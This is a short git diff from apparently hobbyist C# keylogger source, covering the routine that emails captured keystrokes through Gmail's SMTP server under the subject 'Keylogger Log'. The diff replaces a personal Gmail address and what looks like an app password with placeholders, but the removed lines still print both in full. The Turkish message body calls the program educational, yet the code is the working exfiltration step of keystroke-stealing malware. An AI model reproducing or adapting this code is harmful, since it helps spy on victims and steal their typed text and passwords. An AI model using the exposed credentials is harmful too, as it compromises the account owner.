@@ -107,14 +107,14 @@ namespace KeyLogger
             try
             {
                 var mail = new MailMessage();
-                mail.From = new MailAddress("meeryemtekeli@gmail.com");
-                mail.To.Add("meeryemtekeli@gmail.com");
+                mail.From = new MailAddress("mail@gmail.com");
+                mail.To.Add("mail@gmail.com");
                 mail.Subject = "Keylogger Log";
                 mail.Body = "Eğitim Amaçlı Yapılan Basit Keylogger Uygulaması İçin Yazdığınız Metin:\r\n\r\n" + logText;
 
 
                 var smtp = new SmtpClient("smtp.gmail.com", 587);
-                smtp.Credentials = new NetworkCredential("meeryemtekeli@gmail.com", "dacy hcux xgtl nuoq"); 
+                smtp.Credentials = new NetworkCredential("mail@gmail.com", "key"); 
                 smtp.EnableSsl = true;
                 smtp.Send(mail);
 
